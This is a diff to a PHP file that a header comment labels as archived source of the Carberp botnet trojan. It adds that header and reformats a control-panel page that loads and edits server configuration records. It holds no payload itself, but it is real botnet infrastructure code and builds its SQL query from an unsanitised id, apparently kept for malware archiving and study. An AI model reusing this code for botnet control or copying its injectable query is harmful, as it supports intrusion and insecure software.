@@ -1,10 +1,22 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 get_function('create_cfg');
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 
-if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT * from bf_servers WHERE id = '.$Cur['id'].' LIMIT 1');
+if(!empty($Cur['id'])){
+	$item = $mysqli->query('SELECT * from bf_servers WHERE id = '.$Cur['id'].' LIMIT 1');
 
 	if($item->id == $Cur['id']){
 		$smarty->assign("item", $item);
@@ -102,12 +114,17 @@ if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT * from bf_servers WHERE 
 			$smarty->assign("errors", $errors);
 		}
 
-		foreach($item as $k => $i){			if(!isset($_POST[$k])){				if($k == 'cfg'){					$_POST[$k] = base64_decode($item->$k);
-				}else{					$_POST[$k] = $item->$k;
+		foreach($item as $k => $i){
+			if(!isset($_POST[$k])){
+				if($k == 'cfg'){
+					$_POST[$k] = base64_decode($item->$k);
+				}else{
+					$_POST[$k] = $item->$k;
 				}
 			}
 		}
-	}else{		exit;
+	}else{
+		exit;
 	}
 
 }
